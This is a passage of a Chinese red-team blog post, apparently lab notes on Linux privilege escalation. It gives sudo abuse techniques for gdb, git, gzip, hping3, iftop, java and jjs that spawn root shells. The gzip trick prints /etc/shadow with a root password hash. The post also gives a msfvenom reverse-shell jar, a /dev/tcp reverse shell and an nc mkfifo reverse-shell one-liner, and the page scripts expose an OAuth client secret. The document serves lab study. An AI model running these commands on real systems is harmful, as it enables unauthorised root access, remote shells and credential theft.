+<h4 id="sudo-gdb"><a href="#sudo-gdb" class="headerlink" title="sudo gdb"></a>sudo gdb</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo gdb -nx -ex <span class="hljs-string">&#x27;!bash&#x27;</span> -ex quit<br>GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1<br>Copyright (C) 2022 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;<br>This is free software: you are free to change and redistribute it.<br>There is NO WARRANTY, to the extent permitted by law.<br>Type <span class="hljs-string">&quot;show copying&quot;</span> and <span class="hljs-string">&quot;show warranty&quot;</span> <span class="hljs-keyword">for</span> details.<br>This GDB was configured as <span class="hljs-string">&quot;x86_64-linux-gnu&quot;</span>.<br>Type <span class="hljs-string">&quot;show configuration&quot;</span> <span class="hljs-keyword">for</span> configuration details.<br>For bug reporting instructions, please see:<br>&lt;https://www.gnu.org/software/gdb/bugs/&gt;.<br>Find the GDB manual and other documentation resources online at:<br>&lt;http://www.gnu.org/software/gdb/documentation/&gt;.<br>For <span class="hljs-built_in">help</span>, <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;help&quot;</span>.<br>Type <span class="hljs-string">&quot;apropos word&quot;</span> to search <span class="hljs-keyword">for</span> commands related to <span class="hljs-string">&quot;word&quot;</span>.<br>root@RedteamNotes:/home/jackie<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+
+<ol>
+<li><code>-nx</code> : “no execute”这个选项告诉 gdb 在启动时不读取任何.gdbinit 文件。.gdbinit 文件是一个配置文件，gdb 在启动时会读取这个文件中的命令。</li>
+<li><code>-ex</code> : “execute”这个选项允许你在 gdb 启动时执行一段 gdb 命令。”execute”</li>
+<li><code>&#39;!bash&#39;</code> : 在 gdb 中，!用来执行 shell 命令，因此!bash 就是在 gdb 中启动一个 bash shell。</li>
+<li><code>-ex quit</code> : 这个命令让 gdb 在执行完前面的命令之后退出。</li>
+</ol>
+<h4 id="sudo-git"><a href="#sudo-git" class="headerlink" title="sudo git"></a>sudo git</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo git branch --<span class="hljs-built_in">help</span><br>!/bin/sh<br>root@RedteamNotes:/home/jackie<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+
+<p>git 用的标准 manual 工具，然后就可以用 manual 提权的思路了。和 less、more 的类似。</p>
+<h4 id="sudo-gzip-x2F-gunzip"><a href="#sudo-gzip-x2F-gunzip" class="headerlink" title="sudo gzip&#x2F;gunzip"></a>sudo gzip&#x2F;gunzip</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo gzip -f /etc/shadow -t<br>root:$6$1mokVIOR1y0hKn2n$.ImQujW12YEC4sMF7IQcUQmLStAQHuByyNhVIiEzvF/SQx3nBMPBFi4xQ4<br>0sp80V6ivaJEAy/0n23TsTi.AnO.:19495:0:99999:7:::<br></code></pre></td></tr></table></figure>
+
+<p>因为 sudo 允许命令以 root 用户的权限运行。当 gzip -t 尝试读取和测试 &#x2F;etc&#x2F;shadow 时，它实际上访问了这个包含敏感信息的文件</p>
+<h4 id="sudo-hping3"><a href="#sudo-hping3" class="headerlink" title="sudo hping3"></a>sudo hping3</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo hping3<br>hping3&gt; /bin/bash<br>root@RedteamNotes:/home/jackie<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p>Hping3 是一个强大的网络工具，主要用于分析和测试网络环境，生成各种类型的 ICMP、IP、TCP、UDP 或 RAW-IP 协议数据包。</p>
+<h4 id="sudo-iftop"><a href="#sudo-iftop" class="headerlink" title="sudo iftop"></a>sudo iftop</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@RedteamNotes:~$ sudo iftop<br>!/bin/bash<br>interface: eth0<br>IP address is: 10.10.10.12<br>MAC address is: 00:0c:29:b2:08:d5<br>root@RedteamNotes:/home/user<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p>在 iftop 界面，输入！进入命令模式，输入&#x2F;bin&#x2F;bash 启动子 shell。iftop 是一个命令行的网络流量监控工具，用于实时显示一个网络接口的带宽使用情况。类似于 top 命令，它可以提供活动的网络连接和使用带宽的实时视图。</p>
+<h4 id="sudo-java"><a href="#sudo-java" class="headerlink" title="sudo java"></a>sudo java</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># kali中生成反弹shell的jar包，将其上传到靶机</span><br>┌──(kali㉿kali)-[~/Musics/PrivEscaLabs/sudoers]<br>└─$ sudo msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f jar -o<br>shell.jar<br>[sudo] password <span class="hljs-keyword">for</span> kali:<br>Payload size: 7502 bytes<br>Final size of jar file: 7502 bytes<br>Saved as: shell.jar<br><br><span class="hljs-comment"># sudo 执行</span><br>jackie@RedteamNotes:/tmp$ sudo /usr/bin/java -jar shell.jar<br></code></pre></td></tr></table></figure>
+
+<h4 id="sudo-jjs"><a href="#sudo-jjs" class="headerlink" title="sudo jjs"></a>sudo jjs</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 这次GTFOBins的语句可能是不生效的，进场会彻底卡死靶机</span><br><span class="hljs-comment"># 参考了 https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Java.type(&#x27;java.lang.Runtime&#x27;).getRuntime().exec([&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,&#x27;exec 5&lt;&gt;/dev/tcp/10.10.10.10/9595;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&#x27;]).waitFor()&quot;</span> | sudo jjs<br></code></pre></td></tr></table></figure>
+
+<p>有些时候提高交互性可能会失败，这时候可以用 <code>echo $SHELL</code> 尝试探查，如果异常，可以新建一个反弹 shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> /tmp/f;<span class="hljs-built_in">mkfifo</span> /tmp/f;<span class="hljs-built_in">cat</span> /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.10.10 4444 &gt;/tmp/f<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>「红队笔记」Linux提权精讲</div>
+      <div>https://i3eg1nner.github.io/2023/07/fc6d5535056b.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年7月4日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/07/7cab9214becf.html" title="">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/07/57098f1aa06f.html" title="Bulldog_1 靶机">
+                        <span class="hidden-mobile">Bulldog_1 靶机</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: 'bc27ffa18f2a8a15fc16645f679b38eb'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
